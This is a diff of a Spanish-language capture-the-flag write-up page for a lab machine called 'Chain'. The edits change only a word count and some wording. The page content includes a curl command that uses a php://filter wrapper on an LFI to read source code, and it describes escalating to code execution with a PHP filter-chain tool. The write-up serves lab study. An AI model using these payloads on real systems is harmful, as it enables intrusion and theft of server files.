@@ -52,7 +52,7 @@
         },
         "datePublished": "2023-08-16",
         "description": "Writeup Chain 🟡",
-        "wordCount":  696 ,
+        "wordCount":  699 ,
         "mainEntityOfPage": "True",
         "dateModified": "2023-08-16",
         "image": {
@@ -270,7 +270,7 @@ stroke-linejoin="round" class="feather feather-home">
 <p><img src="/../machines/nyx/chain/ip.webp" alt="ip"></p>
 <p>Con metodología básica encuentro un LFI.</p>
 <p><img src="/../machines/nyx/chain/lfi.webp" alt="lfi"></p>
-<p>Mediante wrappers puedo leer el contenido del archivo <code>include.php</code> codificado en base64.</p>
+<p>Mediante wrappers puedo leer el contenido del archivo <code>include.php</code> y resto de archivos.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ curl &#39;http://utils.chaincorp.nyx/include.php?in=php://filter/convert.base64-encode/resource=include.php&#39;
 </span></span><span style="display:flex;"><span>&lt;pre&gt;
 </span></span><span style="display:flex;"><span>PHByZT4KPD9waHAKICAkZmlsZSA9ICRfR0VUWyJpbiJdOwogIGlmKGlzc2V0KCRmaWxlKSkKICB7CiAgICBpbmNsdWRlKCIkZmlsZSIpOwogIH0KPz4KPC9wcmU+Cg==&lt;/pre&gt;
@@ -285,7 +285,7 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span><span style="display:flex;"><span>  }
 </span></span><span style="display:flex;"><span>?&gt;
 </span></span><span style="display:flex;"><span>&lt;/pre&gt;
-</span></span></code></pre></div><p>Existe un método para obtener RCE a partir de un LFI conocida como <a href="https://exploit-notes.hdks.org/exploit/web/security-risk/php-filters-chain/">Filter Chain</a>. Me descargo la herramienta y genero una cadena con el comando <code>ls -la</code>.</p>
+</span></span></code></pre></div><p>Sabiendo esto, existe un método para obtener RCE a partir de un LFI conocida como <a href="https://exploit-notes.hdks.org/exploit/web/security-risk/php-filters-chain/">Filter Chain</a>. Me descargo la herramienta y genero una cadena con el comando <code>ls -la</code>.</p>
 <p><img src="/../machines/nyx/chain/chain_g_ls.webp" alt="chain_g_ls"></p>
 <p>Copio el churraco, lo pego en el navegador y puedo comprobar que tengo funciona correctamente.</p>
 <p><img src="/../machines/nyx/chain/chain_RCE.webp" alt="chain_RCE"></p>
